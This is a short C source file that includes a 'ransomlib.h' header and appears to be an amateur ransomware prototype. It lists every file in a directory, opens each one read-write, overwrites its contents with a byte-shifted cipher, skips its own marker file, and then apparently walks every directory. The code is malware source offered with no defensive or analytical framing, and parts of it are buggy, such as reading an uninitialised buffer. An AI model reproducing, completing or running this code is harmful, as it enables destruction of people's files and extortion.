#include "ransomlib.h"

void	encriptado(int fd)
{
	char	*buff;
	char	crypt;
	int	lec;

	lec = 1;
	buff = malloc(sizeof(char) * 2);
	while (lec > 0)
	{
		if (buff[0] == '\n')
			crypt = '\n';
		else
			crypt = buff[0] + 10;
		write(fd, &crypt, 1);
		lec = read(fd, buff, 1);
	}
}

int	finder(char *s, char *find)
{
	int	i;
	int	y;

	i = 0;
	y = 0;
	while (s[i])
	{
		while (s[i] && s[i] == find[y])
		{
			i++;
			y++;
			if (find[y] == '\0')
				return (1);
		}
		if (s[i] == '\0')
			return (0);
		i++;
	}
	return (0);
}

void	inside_directory()
{
	int	fd_ls;
	char	*buff;
	int	fd_file;
	int	i;

	i = 0;
	system("ls > files");
	fd_ls = open("files", O_RDONLY);
	buff = get_next_line(fd_ls);
	while (buff)
	{
		while (buff[i] && buff[i] != '\n')
			i++;
		buff[i] = '\0';
		i = 0;
		fd_file = open(buff, O_RDWR);
		encriptado(fd_file);
		buff = get_next_line(fd_ls);
		if (buff && finder(buff, "encryptacioon_va") == 1)
			buff = get_next_line(fd_ls);
	}
}


int main()
{
//	inside_directory();
//	printf("Files crypted!");

	fr_every_single_directory();
	return (0);
}

